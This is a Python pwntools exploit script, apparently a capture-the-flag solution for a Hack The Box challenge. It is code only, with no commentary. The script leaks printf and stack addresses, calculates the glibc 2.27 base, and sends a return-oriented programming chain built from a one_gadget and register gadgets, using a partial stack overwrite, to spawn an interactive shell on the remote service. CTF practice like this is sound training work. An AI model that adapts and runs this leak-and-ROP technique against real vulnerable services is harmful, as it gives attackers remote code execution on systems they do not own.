from pwn import *
p = remote('docker.hackthebox.eu','30182')

p.recvuntil('>')
msg = b'y' + b'Z'*21
msg += p64(0)
p.sendline(msg)

data = p.recvline()
log.info(data)

PRINTF = data[95:109]
RSI_STACK = data[78:92]
PRINTF = PRINTF.decode('ascii')
RSI_STACK = RSI_STACK.decode('ascii')
PRINTF = int(PRINTF, 16)
RSI_STACK = int(RSI_STACK, 16)

#2.27 X64

LIBC_BEGIN = PRINTF - 0x64f70 
log.info(hex(LIBC_BEGIN))
ONE_GADGET = LIBC_BEGIN + 0xe5622
MOV_RDX_RAX = LIBC_BEGIN + 0x014148d
POP_RCX = LIBC_BEGIN + 0x34da3
REDIR = RSI_STACK & 0x000000FF
REDIR = REDIR - 8
payload = p64(MOV_RDX_RAX)
payload += p64(POP_RCX)
payload += b'\x00'*8
payload += p64(ONE_GADGET)
payload += p8(REDIR)
p.recvuntil('>')
p.sendline(payload)
p.interactive()
